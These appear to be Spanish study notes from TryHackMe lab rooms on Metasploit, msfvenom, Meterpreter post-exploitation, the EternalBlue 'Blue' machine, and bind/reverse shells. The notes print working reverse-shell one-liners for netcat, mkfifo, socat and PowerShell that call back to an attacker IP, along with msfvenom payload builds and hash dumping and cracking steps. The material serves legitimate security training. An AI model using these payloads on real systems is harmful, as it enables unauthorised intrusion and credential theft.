Como ya comentabamos al principio, un *exploit* es un mecanismo que aprovecha una vulnerabilidad para hacer que el dispositivo ejecute código malicioso y haga que se comporte de una forma que convenga al atacante. Este código es lo que denominamos el *payload*. Por tanto, *mientras el exploit depende de la vulnerabilidad que estemos asaltando el payload depende del propósito del asalto* siempre teniendo en cuenta que el payload forma parte del mecanismo que entraña el exploit.

En Metasploit funciona de la misma manera, en primer lugar en función de la vulnerabilidad elegimos el exploit, por ejemplo: windows/smb/ms17_010_eternalblue. Una vez lo tenemos elegido, en función del propósito elegimos el payload, con *show payload*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726222411.png' | relative_url }}" text-align="center"/>
</div>

Una vez lo tenemos elegido, lo configuramos mediante *set payload*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726222932.png' | relative_url }}" text-align="center"/>
</div>

y seguidamente configurariamos las opciones tanto del exploit como del payload:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726223129.png' | relative_url }}" text-align="center"/>
</div>

Y una vez la sesión está abierta, podemos abortarla con CTRL+C o pasarla a segundo plano con CTRL+Z para recuperarla posteriormente. Además recordar que tenemos el comando *sessions* que dispone de una gran cantidad de opciones y modificadores para el manejo de sesiones:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726225925.png' | relative_url }}" text-align="center"/>
</div>

Veamos un caso práctico para poner en práctica lo que hemos aprendido.

<br />

**MsfVenom**

*Msfvenom* es una herramienta de línea de comandos que nos permite generar payloads específicos de acuerdo a unos términos o condiciones concretas a través de Metasploit.

Se incluyen una gran variedad de formatos (PHP, exe, dll, elf, etc) y una gran variedad de versiones de distintos sistemas operativos. Para más información "msfvenom --list formats".

Algunos de las opciones que podemos adjuntar o que podemos crear con Msfvenom son las siguientes:

- *Encoders*: Como ya comentábamos antes, los encoders no son exactamente un tipo de payload, es una modificación que se hace a un payload para codificar su contenido e intentar realizar un bypass a un antimalware.

- *Handlers*: Los handlers son payloads que al ejecutarse en una máquina provocan que la misma escuche conexiones entrantes de forma específica, definiendo una IP y un puerto de escucha.

Esto es especialmente útil cuando se utilizan reverse_shell. Este no es más que una conexión desde la máquina víctima a la máquina del atacante (de ahí el término reverse) para abrir una shell en la máquina víctima, en ese contexto para poder recibir la conexión abrimos el handler y seguidamente ejecutamos la reverse_shell.

En Metasploit existe el modulo "exploit/multi/handler":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727094850.png' | relative_url }}" text-align="center"/>
</div>

Como podemos ver, se configura el tipo de payload (esto es la conexion a escuchar) que debe de coincidir con el payload de la request entrante, el puerto y la dirección IP de la máquina que realiza la petición.

De esta forma, al ejecutar el handler escuchará peticiones y al recibirlar desplegará una shell en función del tipo de payload escogido:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727095939.png' | relative_url }}" text-align="center"/>
</div>

- *Otros payloads*: Basado en las preferencias del atacante, msfvenom puede crear payloads en diversos formatos:

- *Linux Executable and Linkable Format (elf)*:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
Este formato, .elf, es comparable con el formato .exe en Windows. Son ficheros ejecutables para linux. Como tal, necesitas permisos de ejecución en la máquina remota para poder ejecutar estos ficheros, "chmod +x file.elf". Una vez tienes permisos, se ejecuta con "./shell.elf".

- *Windows Executable*:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

<br />
- *PHP*:

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

<br />

- *ASP*:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

<br />

- *Python*:

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

<br />


#### 5.6. Metasploit: Meterpreter.

Meterpreter es un payload de metasploit que provee una shell interactiva propia mediante la cual un atacante puede explorar la máquina víctima o ejecutar código.

Esta se despliega empleando inyección DLL en memoria, como tal reside completamente en memoria y no escribe nada sobre el disco, evitando dejar pruebas (no crea procesos, si no que se ejecuta dentro de uno ya existente) de cara a los antivirus o a los escáneres de red.

Algunos comandos importantes son:

- *getpid*: Da el número de proceso en el que se está ejecutando la sesión.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727175201.png' | relative_url }}" text-align="center"/>
</div>

- *ps*: Nos da los procesos ejecutándose en la máquina:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727175317.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Meterpreter Flavours**

Como decíamos en la sección inicial, existen dos tipos de payloads en Metasploit: *single*; aquellos autocontenidos que no necesitan componentes adicionales para desempeñar su función, *staged* aquellos que necesitaban descargar componentes adicionales para su correcto funcionamiento.

Estos se enviaban en dos partes, primero se envía un *stager* que descarga el resto del contenido.

Con Meterpreter funciona exactamente igual, exiten *single payloads* y *staged payload*. La mejor forma de obtener información es listando y filtrando por meterpreter:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727195417.png' | relative_url }}" text-align="center"/>
</div>

De forma que la lista mostrará versiones de Meterpreter disponibles para los siguientes dispositivos:

- Android
- Apple iOS
- Java
- Linux
- OSX
- PHP
- Python
- Windows

La decisión sobre qué payload de Meterpreter utilizar se basa en tres factores:

- El sistema operativo de la máquina objetivo.
- Componentes adicionales instalados en la máquina objetivo (PHP, Python, etc).
- Tipo de conexión con la máquina víctima. (TCP, UDP, HTTP, etc).

<br />

**Meterpreter Commands**

Con 'help' podemos listar todos los comandos que la sesión de Meterpreter que tenemos abierta es capaz de ejecutar. Son todos ellos comandos intrínsecos

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727203328.png' | relative_url }}" text-align="center"/>
</div>

Todos ellos vienen agrupados en distintas categorías y acompañados de una pequeña descripción.

<br />

**Post-Explotation with Meterpreter**

Existen comandos específicos:

- *Migrate*: Migra Meterpreter a otro proceso:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727204616.png' | relative_url }}" text-align="center"/>
</div>

- *Hashdump*: Este comando volcará, si tiene los sufcientes privilegios, los contenidos de la base de datos (Security Account Manager), son contraseñas almacenadas en el formato NTLM (New Technology LAN Manager)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727205202.png' | relative_url }}" text-align="center"/>
</div>

Si bien no es matemáticamente posible "crackear" estos hashes, es posible que descubra la contraseña de texto sin cifrar utilizando bases de datos NTLM en línea o un ataque de tabla arcoíris (JohnTheRipper). Estos hashes también se pueden usar en ataques Pass-the-Hash para autenticar en otros sistemas que estos usuarios pueden acceder a la misma red.

- *Search*: Busca un contenido en el sistema:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727205634.png' | relative_url }}" text-align="center"/>
</div>

- *Shell*: Abre una shell del sistema operativo de la máquina atacante:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727205710.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Post-explotation challenge**

Veamos un caso práctico. Tenemos una máquina en la que podemos emplear las siguientes credenciales ballen:Password1 que vamos a atacar sobre el servidor SMB mediante el modulo: exploit/windows/smb/psexec.

Así, acudimos a msfconsole y cargamos el exploit que nos indican en el enunciado:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727213012.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, configuramos las opciones correspondientes y lanzamos el modulo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727213051.png' | relative_url }}" text-align="center"/>
</div>

Uno de los primeros comandos que podemos lanzar es 'sysinfo' en el que obtenemos

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727214734.png' | relative_url }}" text-align="center"/>
</div>

Y podemos ver el nombre de la máquina y el dominio.

A continuación, vamos a hacer una enumeración de los shares y para ello, vamos a mantener la sesión en segundo plano pulsando Ctrl+Z:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727220252.png' | relative_url }}" text-align="center"/>
</div>

Y seguidamente buscamos algún módulo de identificación de shares:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727220520.png' | relative_url }}" text-align="center"/>
</div>

Ahora vamos a por el hashdump, sin embargo, no podemos llevar a cabo el dump de la SAM database debido a que antes debemos migrar a otro proceso:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727220858.png' | relative_url }}" text-align="center"/>
</div>

Así:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727220929.png' | relative_url }}" text-align="center"/>
</div>

Y de esta forma:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220727221006.png' | relative_url }}" text-align="center"/>
</div>

Para crackearla alguna de ellas podemos emplear crakeadores online o JohnTheRipper.

<br />

#### 5.6. Blue.

Vamos a poner en práctica lo visto anteriormente explotando una máquina.

En primer lugar, procedemos a llevar a cabo un escaneo de puertos con Nmap:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728101828.png' | relative_url }}" text-align="center"/>
</div>

Observamos que el puerto 445 está abierto con una versión antigua, lo cual puede hacer el servicio vulnerable al exploit "eternalblue":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728102225.png' | relative_url }}" text-align="center"/>
</div>

Así, lanzamos msfconsole, buscamos el modulo, seteamos las opciones correspondientes y lo lanzamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728102436.png' | relative_url }}" text-align="center"/>
</div>

Además, antes de lanzarlo hemos cambiado el payload para que no nos dé una sesión meterpreter:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728102603.png' | relative_url }}" text-align="center"/>
</div>

Ahora procedemos a obtener de la sesión que tenemos, una sesión meterpreter siguiendo los consecuentes pasos:

- Dejamos en background la sesión mediante CTRL+Z:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728103515.png' | relative_url }}" text-align="center"/>
</div>

- Ahora buscamos el modulo shell_to_meterpreter y lo utilizamos con la sesión que tenemos abierta:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728103541.png' | relative_url }}" text-align="center"/>
</div>

- Tenemos ahora más de una sesión abiertantal y como se nos indica a continuación:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728103605.png' | relative_url }}" text-align="center"/>
</div>

Así, nos introducimos en la sesión 3 y abrimos el meterpreter. Seguidamente, para poder llevar a cabo acciones relvenates como escalada de privilegios o hashdump hace falta migrar al proceso adecuado:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728103808.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728103836.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728103853.png' | relative_url }}" text-align="center"/>
</div>

Para crakear estas contraseñas podríamos utilizar JohnTheRipper, Hashcat o en su defecto Crackstation.net.

Por último, buscamos las flags:

- La primera se encuentra en el directorio raíz:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728105519.png' | relative_url }}" text-align="center"/>
</div>

- La segunda se encuentra donde Windows pone las contraseñas:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728105753.png' | relative_url }}" text-align="center"/>
</div>

- La tercera se encuentra entre los documentos del usuarios Jon:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728105856.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 6. Shells & Privilege Escalation.

#### 6.1. Introducción a bind/reverse shell.

**Qué es una shell. Bind shell. Reverse shell.**

En términos muy simples, una shell es un programa que actúa a modo de interfaz entre un usuario y un entorno de línea de comandos (Comand LIne Enviroment; CLI). Es lo que empleamos para ejecutar comandos dentro de un programa o sistema operativo.

Cuando estamos asaltando una máquina, nos conviene acceder a su entorno de comandos mediante una shell para ejecutar código arbitrario. Para ello podemos forzar al servidor remoto de dos formas distintas:

- *bind shell*: Conectándonos a un puerto del servidor y pedir la apertura de una shell.
- *reverse shell*: Hacer que el servidor genere una conexión saliente hacia nosotros y una vez abierta la sesión nos de acceso a una shell.

<br />

**Antecedentes previos**

Antes de continuar existen una serie de herramientas y conceptos con los que debemos de estar famirializados:

- *Netcat*: Este comando es como una navaja suiza en lo referente al tema de networking. Se pueden hacer un montón de operaciones con netcat pero sus shells son a menudo muy inestables.

- *Socat*: Esta es una evolución de Netcat, puede hacer todo lo que hace este y más cosas y mejor. Sin embargo, tiene una sintaxis más complicada y Netcat es mucho más accesible que Socat debido a que está instalado en casi cualquier dispositivo Linux. Ambos, Socat y Netcat tienen versiones para Windows.

- *Metasploit-multihandler*: Ya hemos comentado en este mismo path que los handlers son módulos de metasploit que sirven para escuchar peticiones entrantes, esencialmente relevantes para la gestión de reverse_shell. Las opciones a ajustar en el modulo "auxiliary/multi/handler" es la IP local, el puerto local y el payload que debe coincidir con el tipo de conexión que llega desde el servidor remoto.

- *Metasploit-msfvenom*: Herramienta del marco de Metasploit que permite crear payloads, entre los que se encuentran binid/reverse shells.

- *Recursos en línea*: Hay muchos recursos que tienen código para abrir shells en muchos lenguajes de programación: [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), [SecLists repo](https://github.com/danielmiessler/SecLists), Kali Repositories: /usr/share/webshells

<br />

**Tipos de shell**

Ahora vamos a profundizar más en las dos metodologías que envían shells:

- *Reverse shell*: Esto se produce cuando se fuerza a un servidor a generar una conexión hacia el cliente (máquina atacante). Esta emplea un handler o *listener* para recibir y manejar la conexión.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728220556.png' | relative_url }}" text-align="center"/>
</div>

Las reverse shell sirven sobre todo para evitar reglas de firewalls que bloquean conexiones entrantes a la máquina. Sin embargo el contrapunto es que debes preparar tu red para manejar adecuadamente la petición entrante del servidor.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728220812.png' | relative_url }}" text-align="center"/>
</div>

El procedimiento para abrir una reverse shell consistiría en los siguientes pasos:

- En la máquina atacante preparamos un listener con netcat sobre un puerto:

```bash
sudo nc -lvnp <PORT>
```

El comando anterior prepara a netcat como superusuario para que: "-l" escuche, "-v" verbosee lo que ocurre, "-n" no haga un DNS lookup, "-p" en un puerto local, \<PORT> el número del puerto.



- En el servidor o máquina víctima forzamos una conexión externa en la que llevamos el output de un comando:

```bash
nc <CLIENT-IP> <PORT> -e /bin/bash
```

De esta forma netcat ejecuta en el servidor una terminal (/bin/bash) y envía el output a lo largo de la conexión hasta la máquina cliente. Esta envía el input a introducir al servidor y este lo procesa en el programa devolviendo otra vez el output einiciando de nuevo el bucle:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728180702.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Bind shell*: Estas se producen cuando se fuerza al servidor a escuchar una petición entrante del cliente en un puerto para abrir una shell.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728225441.png' | relative_url }}" text-align="center"/>
</div>

Una bind shell se ejecuta en los siguientes pasos:

- En la máquina atacante se prepara un listener en un puerto en el que se va a compartir el output de un comando ejecutado en la propia máquina:

```bash
nc -lvnp <port> -e "cmd.exe"
```

De esta forma el comando anterior llama a netcat y escucha en un puerto arbitrario una conexión con la que va a compartir el output del comando cmd.exe ejecutado en la misma máquina.

- En la máquina atacante se prepara a netcat para lanzar la misma conexión sobre el puerto anterior de la máquina víctima.

```bash
nc <server-IP> <PORT>
```

De esta forma, ocurre lo mismo que ocurría en el caso de la reverse shell, ambas máquinas intercambian output e input sobre un programa que se ejecuta en el servidor y que es gestionado por el cliente.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728183341.png' | relative_url }}" text-align="center"/>
</div>

Hemos de darnos cuenta de que, sea cual sea el tipo de shell que abramos, primero se prepara un listener en una de las máquinas (o un handler) y seguidamente se genera una conexión con la otra máquina.

Debemos hacer una última distinción entre shells interactivas y no-interactivas:

- *Interactive*: Un ejemplo de shells interactiva son Bash, Powershell, Zsh, etc. Estas son aquellas que permiten la interactuación sequenciada de comandos después de ejecutarlos en lugar de lanzar el comando únicamente.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728185522.png' | relative_url }}" text-align="center"/>
</div>

En el ejemplo anterior se puede ver que se lanza un comando de ssh y la shell induce al usuario a interactuar con el programa que se ejecuta al lanzar el comando.

- *Non-interactive*: Son shells que no poseen tal característica, simplemente lanzan el comando pero este no tiene efecto sobre la shell con la que el usuario interactúa:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220728185826.png' | relative_url }}" text-align="center"/>
</div>

En el ejemplo anterior se puede observar cómo el usuario no puede interactuar con el programa SSH que ha lanzado.

Acompañado a estos conceptos aparecen también los conceptos de *comandos interactivos*, como vim, ssh, etc y los *comandos no interactivos*, aquellos que únicamente devuelven un output y finalizan como whoami, cat, etc.

<br />

**Netcat**

Como ya hemos mencionado anteriormente, Netcat es un comando muy importante en el campo del networking. Veámos de forma minuciosa cómo crear bind/reverse shells con netcat:

- *Reverse Shell*: Como ya hemos comentado, una reverse shell se produce forzando al servidor (máquina víctima) a realizar una conexión con un cliente (máquina atacante) en la que manda el output de una terminal y recibe el input por parte del cliente que procesa en forma de comandos dentro de la terminal.

De esta forma, primero montamos un "listener" con Netcat en la máquina atacante:

```bash
nc -lvpn <PORT>
```

- "-l": Listen
- "-p": port (es necesario saber que si se escoge un puerto por debajo de 1024 habrá que emplear el comando "sudo")
- "-v": verbose
- "-n": No hacer búsquedas DNS.

Y seguidamente en la máquina víctima construimos un comando con Netcat para compartir el output de un programa en ejecución con una máquina externa:

```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

- *\<LOCAL-IP>*: Dirección IP de la máquina atacante.
- *\<PORT>*: Puerto al que conectarse, evidentemente debe coincidir con el puerto escogido por el atacante en el artefacto listener.
- *-e*: Execute.

De esta forma, el servidor y el cliente intercambian respectivamente output e input para gestionar un programa (/bin/bash) cuya ejecución recae en el servidor.

<br />

- *Bind shell*: En una bind shell la conexión se realiza desde el atacante (cliente) a la víctima (servidor).

En primer lugar se debe preparar la máquina víctima para recibir la conexión, con lo que se monta un listener con Netcat que comparta el output de un programa en ejecución:

```bash
nc -lvpn <PORT> -e /bin/bash
```

Y, de nuevo, si el puerto desciende del 1024 hay que emplear "sudo", seguidamente se lanza una conexión desde la máquina atacante:

```bash
nc <SERVER-IP> <PORT>
```

De nuevo, el puerto debe coincidir con el escogido en el anterior.

<br />

**Netcat Shell Stabilisation**

Como ya hemos comentado, aunque Netcat es muy útil, sus shells son muy inestables por defecto; son no interactivas, CTRL+Z se lo carga todo, y suelen generar errores extraños. Esto ocurre principalmente porque las shells de netcat son procesos que corren dentro de una terminal y no una terminal genuina.

Sin embargo, existen múltiples métodos para estabilizar una shell de Netcat, aquí veremos tres de ellas:

- *Técnica 1: Python*:

Esta técnica aplica únicamente sobre máquinas Linux y consiste en utilizar Python para generar una segunda shell más estable. Tiene los siguientes pasos:

- En primer lugar, ejecutamos:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Puede ser que en lugar de teclear python se necesite teclear python2/3.

Este comando spamea una nueva shell creada por Python, sin embargo en este punto esta no se encuentra acabada aunque puede parecer algo menos cutre.

- En segundo lugar:

```bash
export TERM=xterm
```

Esto nos dará acceso a comandos como clear.

- Por último, mandamos nuestra shell a segundo plano con CTRL+Z y luego tecleamos:

```bash
stty raw -echo; fg
```

Esto hace dos cosas, elimina el echo de nuestra terminal para darnos acceso a las arrows key, CTRL+C, etc y luego trae de vuelta el proceso que contiene nuestra terminal en la máquina remota.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220729102923.png' | relative_url }}" text-align="center"/>
</div>

Por último, una vez hayamos terminado con nuestro proceso para revertir los posibles efectos hayamos podido causar en la terminal de nuestro ordenador tecleamos:

```bash
reset
```

Y tecleamos ENTER.

<br />

- *Técnica 2: rlwrap*

*rlwrap* es un comando que habilita el acceso a capcidades como; autocompletado con tab, historial, teclas, etc. Aún así, es necesario algún ajuste manual.

Para emplearlo en primer lugar es necesario instalarlo:

```bash
sudo apt install rlwrap
```

Una vez instalado, creamos un listener con el siguiente comando:

```bash
rlwrap nc -lvnp <port>
```

De esta forma, añadimos al listener de netcat las capacidades proporcionadas por rlwrap. Después envíamos la shell a segundo plano con CTRL+Z y eliminamos el echo de nuestra terminal y volvemos a traer de vuelta el proceso con:

```bash
stty raw -echo; fg
```

- *Técnica 3: Socat*

La tercera técnica de estabilizar una shell de netcat es pasar a una shell de socat. Se trata de una técnica limitada a shells de linux ya que una shell de socat para una máquina Windows no sería más estable que una shell de netcat.

En primer lugar, debemos de transferir [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) a la máquina víctima.

Y seguidamente ejecutamos:

```bash
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

Unos comandos muy útiles son:

```bash
stty rows <number>
```

<br />

```bash
stty cols <number>
```

Para cambiar el número de filas o columnas de las que se compone una terminal.

<br />

**Socat**

Ya hemos comentado que, a grandes rasgos, Socat es muy similar a Netcat en muchos aspectos, pero también es diferente en otros tantos.

La forma más fácil de pensar en Socat es como un conector entre dos puntos, todo lo que esta herramienta hace es proveer conexión entre ambos puntos.

Veámos ahora cómo crear reverse/bind shells con Socat:

- *Reverse shells*:

Ya sabemos que desde una máquina debemos escuchar una conexión en un puerto mientras que desde la otra, la víctima, debemos lanzar una conexión mientras ejecutamos una terminal


- *listener comand*:

```bash
socat TCP-L:<port>
```

- *request comand*:

- Windows:

```cmd
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

- Linux:

```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

- *Bind shells*:

Aquí la situación es la inversa que en el caso anterior, se lanza una conexión desde la máquina atacante y esta es recibida por la víctima que lo maneja a través de un listener con el que ejecuta a su vez una terminal.

- *Listener comand*:

- Windows:

```cmd
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

- Linux:

```bash
socat TCP-L:<PORT> EXEC:"bash -li"
```

- *Request Comand*:

```default
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

<br />

Con esto habríamos terminado la construcción de shells con Socat. Sin embargo, merece la pena echar un vistazo a una funcionalidad muy potente de esta herramienta, *una reverse shell de Linux totalmente estable*. Emplearíamos el siguiente comando a modo de listener en lugar del listener convencional que hemos visto en el apartado anterior:

```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

De nuevo, empleamos socat para conectar dos puntos, un puerto con un fichero, en concreto, estamos pasando el tty (terminal) como un fichero y seguidamente añadimos dos parámetros que juntos son el equivalente al CTRL+Z stty raw -echo;fg que hemos visto anteriormente.

Un listener convencional de socat admite el procesamiento de cualquier conexión, ya sea python, netcat o socat. Sin embargo, para el comando especial anterior, es necesario conectarse mediante otro comando muy específico y se requiere de socat en la máquina víctima. Para ello es útil tener un [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

El comando especial para conectar se al listener es:

```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- socat TCP:\<attacker-ip>:\<attacker-port>, esta parte es sencilla, sencillamente establece una conexión con la máquina atacante.
- EXEC:"bash -li": Ejecuta un shell interactiva, junto con la que pasamos los siguientes parámetros:
- pty: aloja una pseudoterminal en el target de la conexión.
- stderr: se asegura de que cualquier error aparecerá reflejado en la shell.
- sigint: Pasa cualquier CTRL+C como comando del proceso, evitando que eso suponga la terminación de la shell.
- setsid: crea el proceso en una nueva sesión.
- sane: comando para estabilizar la terminal

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220729150315.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Socat Encrypted Shells**

Otra de las funcionalidades de Socat consiste en la capacidad que tiene esta para crear shells cifradas, estas no pueden ser espíadas si la comunicación es interceptada a noser que tengas la clave de descifrado.

Para crear una shell cifrada:

- Primero generamos un certificado:

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Este comando genera una llave rsa de 2048 bits con un certificado autofirmado valida hasta un año. Y juntamos tanto la llave como el certificado en un sólo fichero .pem

```bash
cat shell.key shell.crt > shell.pem
```

- Seguidamente configuramos un listener OPENSSL con nuestro certificado, esto último es obligatorio:

```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

Observemos que el verify=0 informa de que no hay que tratar de validar el certificado ya que este está autofirmado.

- Desde la máquina atacada setearíamos la conexión de la siguiente forma:

```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

Para una bind shell aplicaríamos lo mismo:

- *listener*:

```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

- *connection*:

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220729182337.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Common shell payloads**

En la siguiente sección crearemos payloads con MsfVenom, pero antes veámos cómo podemos crear otros payloads útiles mediante otras herramientas.

Ya hemos empleado por ejemplo netcat para construir una bind/reverse shell empleamos un modificador específico en el comando de la máquina víctima, ya sea a modo de listener:

```bash
nc -lvnp <PORT> -e /bin/bash
```

O a modo de solicitante de la conexión:

```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

Sin embargo, por razones de seguridad obvias, el modificador "-e" ha sido descartado en muchas de las versiones de netcat.

Aún así, seguimos pudiendo crear una reverse shell mediante el siguiente comando:

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Desgranando el comando anterior:

- *mkfifo /tmp/f*: Genera un fichero FIFO, este es un fichero especial que envía datos de un proceso a otro de forma que el receptor lee los datos uno a uno.

- *nc -lvnp \<PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1*: Este comando establece un "listener" por el que compartirá (con la máquina que se conecte al puerto) el output del proceso compartido por el fichero FIFO /tmp/f y seguidamente envía lo que se reciba por el puerto (el input del cliente) como input al proceso /bin/sh (shell tipo sh) que se envía sobre el fichero /tmp/f (cuyo contenido, recordamos, vuelve sobre el puerto, cerrándo así el círculo).

- *rm /tm/f*: Borra el fichero /tm/f porque los procesos ya están conectados.

<br />

Un comando parecido puede emplearse para crear una reverse shell:

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Esto funcionaría para un servidor Linux, para un servidor Windows crearíamos una reverse shell con el siguiente comando:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

En el que debemos de reemplazar "\<IP>, \<PORT>" por la IP y el puerto de la máquina atacante o cliente.

Para otros tipos de reverse shells escritos en otros lenguajes: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

<br />

**Msfvenom**

Msfvenom, es una parte del marco de trabajo de Metasploit y se emplea fundamentalmente para generar payloads de bind/reverse shell en múltiples formatos.

La sintaxis ordinaria de Msfvenom:

```bash
msfvenom -p <PAYLOAD> <OPTIONS>
```

Por ejemplo;

```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

Las opciones son:

- *-f*: formato en el que se expide el ejecutable.
- *-o*: Nombre del fichero en el que se va a expedir el ejecutable.

Recordamos que con Metasploit (y por extensión con Msvenom) existen dos tipos de payloads; staged aquellos que se envían en dos partes: el stager y este una vez dentro se descarga el resto, y el stagedless que se envían de una sola vez y son más comunes aunque más fáciles de interceptar y de ser detectados por antimalware.

Por último, es importante es entender el sistema de nombres de Metasploit, lo más habitual es encontrarnos el siguiente esquema: \<OS>/\<arquitectura>/\<payload>.

Por ejemplo: linux/x86/shell_reverse_tcp

(La arquitectura no se especifica en sistemas de 32 bits por defecto): windows/shell.

Además debemos fijarnos en cómo están escritos los nombres de ciertos payloads. Antes hemos descrito una diferencia entre dos payloads, staged y stagedless:

